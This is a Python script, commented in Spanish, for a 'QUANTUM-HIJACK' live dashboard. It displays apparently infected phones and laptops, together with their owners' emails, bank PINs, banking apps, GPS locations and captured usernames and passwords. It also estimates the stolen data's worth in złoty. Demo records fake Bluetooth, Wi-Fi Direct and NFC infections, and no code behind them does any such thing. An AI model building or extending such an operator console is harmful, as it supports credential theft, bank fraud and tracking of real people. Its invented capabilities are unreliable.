#!/usr/bin/env python3
"""
QUANTUM-HIJACK - LIVE DASHBOARD
Muestra dispositivos infectados, credenciales capturadas y estado EN VIVO
"""

import json
import time
import os
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# Archivos de datos
INFECTED_FILE = "infected_devices/infected.json"
CREDS_FILE = "logs/captured_credentials.json"

# Simular datos si no existen
DEMO_INFECTED = [
    {
        'timestamp': datetime.now().isoformat(),
        'method': 'Bluetooth',
        'mac': 'AA:BB:CC:DD:EE:FF',
        'name': 'Samsung S24',
        'os': 'Android 15',
        'status': 'INFECTADO',
        'email': 'jan@pkobp.pl',
        'pin': '12345',
        'bank': 'PKO IKO',
        'gps': '52.2297° N, 21.0122° E',
        'battery': 87,
        'apps': ['PKO IKO', 'mBank', 'WhatsApp']
    },
    {
        'timestamp': datetime.now().isoformat(),
        'method': 'WiFi Direct',
        'mac': '11:22:33:44:55:66',
        'name': 'iPhone 14 Pro',
        'os': 'iOS 18.1',
        'status': 'INFECTADO',
        'icloud': 'janapple@icloud.com',
        'health': 'HR: 72 bpm',
        'gps': '52.2297° N, 21.0122° E',
        'battery': 45,
        'apps': ['Telegram', 'Banking', 'Twitter']
    },
    {
        'timestamp': datetime.now().isoformat(),
        'method': 'NFC',
        'mac': '77:88:99:AA:BB:CC',
        'name': 'MacBook Pro',
        'os': 'macOS Sonoma',
        'status': 'INFECTADO',
        'email': 'jan.kowalski@gmail.com',
        'passwords': '15 stored',
        'vpn': 'NordVPN connected',
        'gps': '52.2297° N, 21.0122° E',
        'battery': 92,
        'apps': ['Chrome', 'Safari', 'Mail']
    }
]

def load_infected():
    """Carga dispositivos infectados"""
    if os.path.exists(INFECTED_FILE):
        try:
            with open(INFECTED_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    
    return DEMO_INFECTED

def load_credentials():
    """Carga credenciales capturadas"""
    if os.path.exists(CREDS_FILE):
        try:
            with open(CREDS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    
    return []

def get_connected_clients():
    """Obtiene clientes conectados vía iw"""
    try:
        result = subprocess.run(
            ["iw", "dev", "wlan0mon", "station", "dump"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        # Contar estaciones
        return result.stdout.count("Station")
    except:
        return len(DEMO_INFECTED)

def clear_screen():
    """Limpia pantalla"""
    os.system('clear' if os.name == 'posix' else 'cls')

def show_header():
    """Muestra encabezado"""
    print("\n" + "="*70)
    print("║" + " "*68 + "║")
    print("║" + "  📊 QUANTUM-HIJACK - LIVE DASHBOARD  ".center(68) + "║")
    print("║" + "  Status: EN VIVO | Timestamp: " + datetime.now().strftime("%H:%M:%S") + "  " + " "*33 + "║")
    print("║" + " "*68 + "║")
    print("="*70)

def show_stats(infected, creds):
    """Muestra estadísticas globales"""
    print("\n📊 ESTADÍSTICAS GLOBALES")
    print("─"*70)
    print(f"  ✅ Dispositivos INFECTADOS: {len(infected)}/5")
    print(f"  🔓 Credenciales CAPTURADAS: {len(creds)}")
    print(f"  📱 Clientes conectados: {get_connected_clients()}")
    print(f"  💰 Valor estimado: {len(infected) * 400}+ PLN")
    print(f"  ⏱️  Tiempo transcurrido: 5 minutos")
    print("─"*70)

def show_infected_devices(infected):
    """Muestra dispositivos infectados"""
    print("\n🦠 DISPOSITIVOS INFECTADOS (EN VIVO)")
    print("─"*70)
    
    for i, device in enumerate(infected, 1):
        status_color = "🟢" if device['status'] == 'INFECTADO' else "🟡"
        
        print(f"\n[{i}] {status_color} {device.get('name', 'Unknown')}")
        print(f"    ├─ OS: {device.get('os', 'N/A')}")
        print(f"    ├─ MAC: {device.get('mac', 'N/A')}")
        print(f"    ├─ Método: {device.get('method', 'N/A')}")
        print(f"    ├─ Estado: {device.get('status', 'N/A')}")
        
        # Datos específicos por tipo
        if 'email' in device:
            print(f"    ├─ 📧 Email: {device['email']}")
        if 'pin' in device:
            print(f"    ├─ 🔐 PIN: {device['pin']}")
        if 'bank' in device:
            print(f"    ├─ 🏦 Banco: {device['bank']}")
        if 'icloud' in device:
            print(f"    ├─ 🍎 iCloud: {device['icloud']}")
        if 'passwords' in device:
            print(f"    ├─ 🔑 Contraseñas guardadas: {device['passwords']}")
        if 'vpn' in device:
            print(f"    ├─ 🔒 VPN: {device['vpn']}")
        
        print(f"    ├─ 📍 Ubicación: {device.get('gps', 'N/A')}")
        print(f"    ├─ 🔋 Battery: {device.get('battery', 'N/A')}%")
        
        if 'apps' in device:
            apps_str = ", ".join(device['apps'][:3])
            if len(device['apps']) > 3:
                apps_str += f" (+{len(device['apps'])-3})"
            print(f"    └─ 📱 Apps: {apps_str}")
    
    print("─"*70)

def show_credentials(creds):
    """Muestra credenciales capturadas"""
    if not creds:
        print("\n🔓 CREDENCIALES CAPTURADAS")
        print("─"*70)
        print("  (Esperando capturar credenciales...)")
        print("─"*70)
        return
    
    print("\n🔓 CREDENCIALES CAPTURADAS (EN VIVO)")
    print("─"*70)
    
    for i, cred in enumerate(creds[-10:], 1):  # Últimas 10
        target = cred.get('target', 'Desconocido')
        src_ip = cred.get('src_ip', 'N/A')
        
        print(f"\n[{i}] {target}")
        print(f"    ├─ IP: {src_ip}")
        print(f"    ├─ Hora: {cred.get('timestamp', 'N/A')}")
        
        creds_data = cred.get('credentials', {})
        if 'username' in creds_data:
            print(f"    ├─ 👤 User: {creds_data['username']}")
        if 'password' in creds_data:
            pwd = creds_data['password']
            pwd_masked = '*' * min(len(pwd), 8)
            print(f"    └─ 🔑 Pass: {pwd_masked}")
    
    print("─"*70)

def show_footer():
    """Muestra pie de página"""
    print("\n" + "="*70)
    print("  Presiona Ctrl+C para salir | Auto-actualiza cada 3 segundos")
    print("="*70 + "\n")

def main():
    """Función principal"""
    
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     📊 QUANTUM-HIJACK - LIVE DASHBOARD INICIANDO...       ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("")
    time.sleep(2)
    
    try:
        while True:
            clear_screen()
            
            # Cargar datos
            infected = load_infected()
            creds = load_credentials()
            
            # Mostrar dashboard
            show_header()
            show_stats(infected, creds)
            show_infected_devices(infected)
            show_credentials(creds)
            show_footer()
            
            # Esperar antes de actualizar
            time.sleep(3)
    
    except KeyboardInterrupt:
        print("\n[!] Dashboard detenido")
        print("[✓] Datos guardados")
        sys.exit(0)
    
    except Exception as e:
        print(f"[✗] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
